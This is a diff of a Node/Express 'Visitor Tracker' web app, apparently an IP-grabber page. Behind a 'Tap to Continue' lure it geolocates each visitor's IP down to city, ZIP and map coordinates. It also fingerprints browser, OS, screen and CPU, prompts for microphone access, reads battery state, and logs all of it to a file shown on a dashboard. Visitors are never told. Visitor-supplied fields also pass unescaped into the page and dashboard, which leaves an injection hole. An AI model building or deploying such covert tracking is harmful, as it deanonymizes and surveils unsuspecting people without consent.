@@ -24,100 +24,104 @@ app.get("/", async (req, res) => {
   const os = parser.getOS().name || "Unknown";
   const device = parser.getDevice().type || "Desktop";
 
-  let city = "Loading...";
-  let region = "";
-  let country = "";
-  let lat = 20;
-  let lon = 78;
-  let isp = "Loading...";
-  let org = "";
-  let timezone = "";
-  let zip = "";
+  let city = "Unknown";
+  let region = "Unknown";
+  let country = "Unknown";
+  let lat = 0;
+  let lon = 0;
+  let isp = "Unknown";
+  let org = "Unknown";
+  let timezone = "Unknown";
+  let zip = "Unknown";
 
-  // FAST API CALL (non-blocking)
-  axios.get(`http://ip-api.com/json/${ip}`)
-    .then(r => {
-      if (r.data.status === "success") {
-        city = r.data.city;
-        region = r.data.regionName;
-        country = r.data.country;
-        lat = r.data.lat;
-        lon = r.data.lon;
-        isp = r.data.isp;
-        org = r.data.org;
-        timezone = r.data.timezone;
-        zip = r.data.zip;
-      }
-    })
-    .catch(()=>{});
+  try {
+    const response = await axios.get(
+      `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone,zip`
+    );
+
+    if (response.data.status === "success") {
+      city = response.data.city || "Unknown";
+      region = response.data.regionName || "Unknown";
+      country = response.data.country || "Unknown";
+      lat = response.data.lat || 0;
+      lon = response.data.lon || 0;
+      isp = response.data.isp || "Unknown";
+      org = response.data.org || "Unknown";
+      timezone = response.data.timezone || "Unknown";
+      zip = response.data.zip || "Unknown";
+    }
+  } catch (e) {}
 
   const time = new Date().toLocaleString("en-IN", {
     timeZone: "Asia/Kolkata"
   });
 
-  const baseLog = `${ip}|${city}, ${region}, ${country}|${browser}|${os}|${device}|${isp}|${referrer}|${time}`;
+  const baseLog = `${ip}|${city}, ${region}, ${country}|${browser}|${os}|${device}|${isp} (${org})|${referrer}|${time}`;
 
   res.send(`
 <!DOCTYPE html>
 <html>
 <head>
-<title>Visitor Tracker</title>
-<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+  <title>Visitor Tracker</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+  <style>
+    body { font-family: Arial; text-align: center; background: #f4f6f9; margin:0; }
 
-<style>
-body {
-  margin:0;
-  font-family: Arial;
-  background:#f4f6f9;
-  text-align:center;
-}
+    .card {
+      width: 400px;
+      margin: 30px auto;
+      padding: 20px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    }
 
-.card {
-  width:400px;
-  margin:30px auto;
-  padding:20px;
-  background:white;
-  border-radius:12px;
-  box-shadow:0 5px 20px rgba(0,0,0,0.1);
-}
+    #map {
+      width: 400px;
+      height: 300px;
+      margin: auto;
+      border-radius: 10px;
+    }
 
-#map {
-  width:400px;
-  height:300px;
-  margin:auto;
-  border-radius:10px;
-}
+    .highlight { color: #667eea; font-weight: bold; }
 
-.highlight {
-  color:#667eea;
-  font-weight:bold;
-}
+    /* START SCREEN */
+    #startScreen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      cursor: pointer;
+    }
 
-/* START SCREEN */
-#startScreen {
-  position:fixed;
-  width:100%;
-  height:100%;
-  background:linear-gradient(135deg,#667eea,#764ba2);
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  z-index:9999;
-  cursor:pointer;
-}
+    .start-box {
+      text-align: center;
+      color: white;
+      animation: pulse 1.5s infinite;
+    }
 
-.start-box {
-  color:white;
-  text-align:center;
-  animation:pulse 1.5s infinite;
-}
+    .start-box h1 {
+      font-size: 32px;
+      margin-bottom: 10px;
+    }
 
-@keyframes pulse {
-  0% { transform:scale(1); }
-  50% { transform:scale(1.1); }
-  100% { transform:scale(1); }
-}
-</style>
+    .start-box p {
+      font-size: 16px;
+      opacity: 0.8;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.08); }
+      100% { transform: scale(1); }
+    }
+  </style>
 </head>
 
 <body>
@@ -126,7 +130,7 @@ body {
 <div id="startScreen">
   <div class="start-box">
     <h1>Tap to Continue</h1>
-    <p>Click anywhere</p>
+    <p>Click anywhere to proceed</p>
   </div>
 </div>
 
@@ -140,7 +144,10 @@ body {
 <div class="card">
   <h2>Visitor Info</h2>
   <div>IP: <span class="highlight">${ip}</span></div>
-  <div id="location">Location: Loading...</div>
+  <div>Location: <span class="highlight">${city}, ${region}, ${country}</span></div>
+  <div>ZIP: <span class="highlight">${zip}</span></div>
+  <div>Timezone: <span class="highlight">${timezone}</span></div>
+  <div>Org: <span class="highlight">${org}</span></div>
   <div>Browser: <span class="highlight">${browser}</span></div>
   <div>OS: <span class="highlight">${os}</span></div>
   <div>Device: <span class="highlight">${device}</span></div>
@@ -155,56 +162,99 @@ body {
 <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 
 <script>
-const audio = document.getElementById("sound");
-const startScreen = document.getElementById("startScreen");
-const mainContent = document.getElementById("mainContent");
+  const audio = document.getElementById("sound");
+  const startScreen = document.getElementById("startScreen");
+  const mainContent = document.getElementById("mainContent");
 
-function startExperience() {
-  audio.volume = 1.0; // MAX allowed by browser
+  function startExperience() {
+    audio.play().catch(()=>{});
 
-  audio.play().catch(()=>{});
+    startScreen.style.display = "none";
+    mainContent.style.display = "block";
 
-  startScreen.style.display = "none";
-  mainContent.style.display = "block";
+    // FIXED MAP INIT
+    setTimeout(() => {
+      var map = L.map('map').setView([${lat}, ${lon}], 10);
 
-  setTimeout(() => {
-    var map = L.map('map').setView([${lat}, ${lon}], 5);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png')
+        .addTo(map);
 
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png')
-      .addTo(map);
+      L.marker([${lat}, ${lon}])
+        .addTo(map)
+        .bindPopup("Visitor")
+        .openPopup();
 
-    L.marker([${lat}, ${lon}])
-      .addTo(map)
-      .bindPopup("Visitor")
-      .openPopup();
+      map.invalidateSize();
+    }, 100);
+  }
 
-    map.invalidateSize();
-  }, 100);
+  ["click","touchstart","keydown"].forEach(e => {
+    document.addEventListener(e, startExperience, { once: true });
+  });
 
-  setTimeout(() => {
-    document.getElementById("location").innerText =
-      "Location: ${city}, ${region}, ${country}";
-  }, 500);
-}
+  // SCREEN + CPU
+  const screenSize = screen.width + "x" + screen.height;
+  const cpu = navigator.hardwareConcurrency || "Unknown";
 
-// MULTI DEVICE SUPPORT
-["click","touchstart","keydown"].forEach(e => {
-  document.addEventListener(e, startExperience, { once: true });
-});
+  fetch("/log-extra", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      log: "${baseLog}",
+      screen: screenSize,
+      cpu: cpu
+    })
+  });
 
-// EXTRA DATA LOG
-const screenSize = screen.width + "x" + screen.height;
-const cpu = navigator.hardwareConcurrency || "Unknown";
+  // AUDIO DEVICES
+  async function detectAudioDevices() {
+    let mic = "Not allowed";
+    let speakers = "Unknown";
 
-fetch("/log-extra", {
-  method:"POST",
-  headers:{"Content-Type":"application/json"},
-  body: JSON.stringify({
-    log: "${baseLog}",
-    screen: screenSize,
-    cpu: cpu
-  })
-});
+    try {
+      await navigator.mediaDevices.getUserMedia({ audio: true });
+      const devices = await navigator.mediaDevices.enumerateDevices();
+
+      mic = devices.some(d => d.kind === "audioinput") ? "Yes" : "No";
+      speakers = devices.some(d => d.kind === "audiooutput") ? "Yes" : "No";
+
+    } catch {
+      mic = "Denied";
+      speakers = "Unknown";
+    }
+
+    fetch("/log-audio", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ mic, speakers })
+    });
+  }
+
+  document.addEventListener("click", detectAudioDevices, { once: true });
+
+  // BATTERY
+  async function getBatteryInfo() {
+    let level = "Not supported";
+    let charging = "Unknown";
+
+    try {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        level = Math.round(battery.level * 100) + "%";
+        charging = battery.charging ? "Yes" : "No";
+      }
+    } catch {
+      level = "Error";
+    }
+
+    fetch("/log-battery", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ level, charging })
+    });
+  }
+
+  document.addEventListener("click", getBatteryInfo, { once: true });
 </script>
 
 </body>
@@ -212,10 +262,24 @@ fetch("/log-extra", {
   `);
 });
 
-// ================= LOG =================
+// ================= LOG EXTRA =================
 app.post("/log-extra", (req, res) => {
   const { log, screen, cpu } = req.body;
   fs.appendFileSync(__dirname + "/ips.txt", `${log}|${screen}|CPU:${cpu}\n`);
+  res.sendStatus(200);
+});
+
+// ================= AUDIO LOG =================
+app.post("/log-audio", (req, res) => {
+  const { mic, speakers } = req.body;
+  fs.appendFileSync(__dirname + "/ips.txt", `Audio | Mic:${mic} | Speakers:${speakers}\n`);
+  res.sendStatus(200);
+});
+
+// ================= BATTERY LOG =================
+app.post("/log-battery", (req, res) => {
+  const { level, charging } = req.body;
+  fs.appendFileSync(__dirname + "/ips.txt", `Battery | ${level} | Charging:${charging}\n`);
   res.sendStatus(200);
 });
 
@@ -228,25 +292,34 @@ app.get("/dashboard", (req, res) => {
     const lines = data.trim().split("\n").reverse();
 
     lines.forEach(line => {
-      const p = line.split("|");
+      if (
+        line.includes("127.0.0.1") ||
+        line.includes("undefined") ||
+        !line.includes("|")
+      ) return;
 
-      if (p.length >= 10) {
+      const parts = line.split("|");
+
+      if (parts.length >= 10) {
         rows += `
         <tr>
-          <td>${p[0]}</td>
-          <td>${p[1]}</td>
-          <td>${p[2]}</td>
-          <td>${p[3]}</td>
-          <td>${p[4]}</td>
-          <td>${p[5]}</td>
-          <td>${p[6]}</td>
-          <td>${p[7]}</td>
-          <td>${p[8]}</td>
-          <td>${p[9]}</td>
+          <td>${parts[0]}</td>
+          <td>${parts[1]}</td>
+          <td>${parts[2]}</td>
+          <td>${parts[3]}</td>
+          <td>${parts[4]}</td>
+          <td>${parts[5]}</td>
+          <td>${parts[6]}</td>
+          <td>${parts[7]}</td>
+          <td>${parts[8]}</td>
+          <td>${parts[9]}</td>
         </tr>`;
       }
     });
-  } catch {}
+
+  } catch {
+    rows = "<tr><td colspan='10'>No data yet</td></tr>";
+  }
 
   res.send(`
   <html>
@@ -254,9 +327,16 @@ app.get("/dashboard", (req, res) => {
     <h2>Visitor Dashboard</h2>
     <table border="1" cellpadding="10" style="width:100%;background:white;">
       <tr>
-        <th>IP</th><th>Location</th><th>Browser</th><th>OS</th>
-        <th>Device</th><th>ISP</th><th>Referrer</th>
-        <th>Time</th><th>Screen</th><th>CPU</th>
+        <th>IP</th>
+        <th>Location</th>
+        <th>Browser</th>
+        <th>OS</th>
+        <th>Device</th>
+        <th>ISP</th>
+        <th>Referrer</th>
+        <th>Time</th>
+        <th>Screen</th>
+        <th>CPU</th>
       </tr>
       ${rows}
     </table>
@@ -265,6 +345,4 @@ app.get("/dashboard", (req, res) => {
   `);
 });
 
-app.listen(process.env.PORT || 3000, () => {
-  console.log("Server running...");
-});
+app.listen(process.env.PORT || 3000);
